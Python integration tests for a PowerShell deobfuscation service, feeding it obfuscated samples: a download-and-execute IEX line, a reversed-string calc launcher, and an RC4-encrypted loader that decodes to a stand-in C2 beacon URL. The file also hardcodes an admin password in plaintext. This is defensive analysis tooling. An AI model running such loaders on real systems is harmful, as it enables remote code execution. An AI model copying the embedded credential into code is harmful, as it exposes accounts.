"""RC4.3 · POST /api/decode/smart integration tests for powershell-normalize + regressions."""
import os, time
import pytest
import requests

BASE_URL = os.environ.get("REACT_APP_BACKEND_URL", "http://localhost:8001").rstrip("/")
ADMIN_EMAIL = "admin@nivxray.com"
ADMIN_PASSWORD = "uulVDp5cCSB3Hva99s7UUAwK"


@pytest.fixture(scope="session")
def token():
    last = None
    for _ in range(3):
        try:
            r = requests.post(
                f"{BASE_URL}/api/auth/login",
                json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD},
                timeout=90,
            )
            if r.status_code == 200:
                return r.json().get("access_token") or r.json().get("token")
            last = f"{r.status_code}:{r.text[:200]}"
        except Exception as e:
            last = str(e)
            time.sleep(2)
    pytest.skip(f"login failed: {last}")


@pytest.fixture
def client(token):
    s = requests.Session()
    s.headers.update({"Content-Type": "application/json", "Authorization": f"Bearer {token}"})
    return s


def smart(client, payload):
    r = client.post(f"{BASE_URL}/api/decode/smart", json={"input": payload}, timeout=120)
    assert r.status_code == 200, f"{r.status_code}: {r.text[:400]}"
    return r.json()


def _ops(res):
    return [step.get("op") for step in (res.get("recipe") or [])]


# --- Flow 1: reviewer exact mixed-case comma-token example ---
def test_flow1_reviewer_mixed_case(client):
    inp = ('PoWeRsHeLl.eXe,-NoPrOfIlE,-ExEcUtIoNpOlIcY,ByPaSs,-CoMmAnD,'
           '"Write-Host \'[+] Mixed Case & Token Separation Test\'"')
    res = smart(client, inp)
    assert "powershell-normalize" in _ops(res), f"ops={_ops(res)}"
    raw = res.get("output_raw") or ""
    assert "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command" in raw
    assert "[+] Mixed Case & Token Separation Test" in raw
    assert "Runtime Output (Simulation" in raw
    assert "comma-token-separator" in raw


# --- Flow 2: unsafe IEX payload MUST NOT be simulated ---
def test_flow2_unsafe_iex_not_simulated(client):
    inp = 'powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://x/y\')"'
    res = smart(client, inp)
    raw = res.get("output_raw") or ""
    assert "Runtime Output (Simulation \u00b7 deterministic)" not in raw
    assert ("not a safe built-in" in raw) or ("not attempted" in raw)


# --- Flow 3: Echo alias safe built-in simulation ---
def test_flow3_echo_alias_simulated(client):
    inp = 'powershell.exe -Command "Echo \'hello\'"'
    res = smart(client, inp)
    assert "powershell-normalize" in _ops(res)
    raw = res.get("output_raw") or ""
    assert "Runtime Output" in raw
    assert "hello" in raw


# --- Flow 4: quoted commas preserved verbatim ---
def test_flow4_quoted_commas_preserved(client):
    inp = 'powershell.exe -Command "Write-Host \'a,b,c\'"'
    res = smart(client, inp)
    raw = res.get("output_raw") or ""
    assert "'a,b,c'" in raw


# --- Regression: RC4.2 semantic-mini slice recovers exe.calc ---
def test_regression_rc42_slice_recover(client):
    inp = "Invoke-Expression (('exe.clac') -join '' -replace '([a-z]+)\\.([a-z]+)','$2.$1' | ForEach-Object { $_[-1..-8] -join '' })"
    res = smart(client, inp)
    raw = res.get("output_raw") or ""
    assert "Recovered command:  exe.calc" in raw or "exe.calc" in raw


# --- Regression: RC4.1 inline RC4 loader recovers c2 URL ---
def test_regression_rc41_rc4_url(client):
    # Canonical RC4.1 vector reused from test_rc42_smart_decode_flows.py
    inp = (
        "$key = [System.Text.Encoding]::ASCII.GetBytes('NivXKey2026'); "
        "$cipher = [Convert]::FromBase64String('1czR7GQkGxqyMkprVmc8OtH7q4577QmQ'); "
        "$S = 0..255; $j = 0; "
        "for ($i=0; $i -lt 256; $i++) { "
        "  $j = ($j + $S[$i] + $key[$i % $key.Length]) % 256; "
        "  $t = $S[$i]; $S[$i] = $S[$j]; $S[$j] = $t } "
        "$i=0; $j=0; $out = New-Object byte[] $cipher.Length; "
        "for ($k=0; $k -lt $cipher.Length; $k++) { "
        "  $i = ($i+1) % 256; $j = ($j + $S[$i]) % 256; "
        "  $t = $S[$i]; $S[$i] = $S[$j]; $S[$j] = $t; "
        "  $out[$k] = $cipher[$k] -bxor $S[($S[$i]+$S[$j]) % 256] } "
        "Invoke-Expression ([Text.Encoding]::ASCII.GetString($out))"
    )
    res = smart(client, inp)
    raw = res.get("output_raw") or ""
    # Accept any indicator that RC4.1 recovery still fires; primary target is the URL
    assert ("http://c2.evil.io/beacon" in raw) or ("c2.evil.io" in raw), f"raw missing c2 url: {raw[:600]}"


# --- Regression: benign Get-Process not malicious ---
def test_regression_benign_get_process(client):
    res = smart(client, "Get-Process | Where-Object CPU -gt 100")
    verdict = (res.get("verdict") or res.get("classification") or "").lower()
    # search everywhere
    blob = str(res).lower()
    assert "malicious" not in verdict
    # sanity: not flagged as malicious in top-level verdict fields
    assert not any(k in blob for k in ["\"verdict\": \"malicious\"", "'verdict': 'malicious'"])
